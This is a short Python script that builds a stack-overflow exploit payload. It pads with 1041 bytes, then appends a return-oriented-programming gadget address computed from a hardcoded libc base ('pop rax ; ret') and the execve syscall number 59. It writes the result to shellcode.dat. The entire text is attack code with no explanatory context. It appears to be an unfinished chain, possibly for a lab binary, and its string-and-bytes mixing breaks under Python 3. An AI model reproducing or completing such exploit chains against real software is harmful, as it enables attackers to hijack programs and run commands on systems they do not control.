#!/usr/bin/python

import struct

import binascii
LIBC_OFFSET = 0x7ffff7a3a000
g1 = LIBC_OFFSET + 0xe76fa # pop rax ; ret
d1 = 59
shellcode = 'A'*(1041)

shellcode += struct.pack('<q', g1)
shellcode += struct.pack('<q', d1)

print ("shellcode: "+ shellcode)
with open("shellcode.dat", "wb") as f:
    f.write(shellcode)
print (binascii.hexlify(shellcode))
print ("g1: %x" % (g1))